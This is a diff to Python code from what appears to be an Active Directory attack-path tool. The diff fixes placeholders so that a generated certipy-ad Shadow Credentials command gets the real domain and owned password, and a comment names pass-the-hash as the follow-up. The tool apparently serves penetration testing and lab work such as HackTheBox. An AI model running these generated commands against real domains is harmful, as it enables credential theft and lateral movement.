@@ -835,11 +835,13 @@ def run(report, store, ui=None):
             # target. Falls back to '<DC>' placeholder when unknown.
             _dc_e = store.dc_ip() or "<DC>"
             # iter-59: look up the actor's password so commands like
-            # 'certipy-ad shadow auto -u HELPDESK -p {_owned_pw}' become
+            # 'certipy-ad shadow auto -u HELPDESK -p <owned-password>' become
             # 'certipy-ad shadow auto -u HELPDESK -p ThePassword'. Falls
-            # back to '{_owned_pw}' when the resolved principal isn't in
+            # back to '<owned-password>' when the resolved principal isn't in
             # e.creds (e.g. principal name doesn't match a stored cred).
-            _owned_pw = "{_owned_pw}"
+            # iter-64: use angle-bracket placeholder (was literal '{_owned_pw}'
+            # which looked like an unfilled Python format spec in output).
+            _owned_pw = "<owned-password>"
             if _pname:
                 _pname_lc = _pname.lower()
                 for (_ulc, _pw), _ in e.creds.items():
@@ -875,12 +877,16 @@ def run(report, store, ui=None):
                     ], src=edge["src"], line=edge["line"]))
                 continue
             if r == "AddKeyCredentialLink":
+                # iter-64: R-SHADOW had literal '<dom>' in the certipy-ad
+                # UPN slot even after iter-44 threaded the real domain into
+                # every other ACL-edge chain. Fixed to use _dom_e so the
+                # operator gets 'user@htb.local' instead of 'user@<dom>'.
                 chains.append(Chain("R-SHADOW", "shadow credentials",
                     f"AddKeyCredentialLink: {actor} -> {tgt} "
                     f"(Shadow Creds -> PKINIT -> NT hash)",
                     crit=9, conf=0.85, ready=1.4, prox=0.9,         # score 9.64
                     commands=[
-                        f"certipy-ad shadow auto -u '{_owned}@<dom>' "
+                        f"certipy-ad shadow auto -u '{_owned}@{_dom_e}' "
                         f"-p '{_owned_pw}' -account '{tgt}' -dc-ip {_dc_e}",
                         f"# certipy prints {tgt}'s NT hash; PtH (see R7)",
                     ], src=edge["src"], line=edge["line"]))
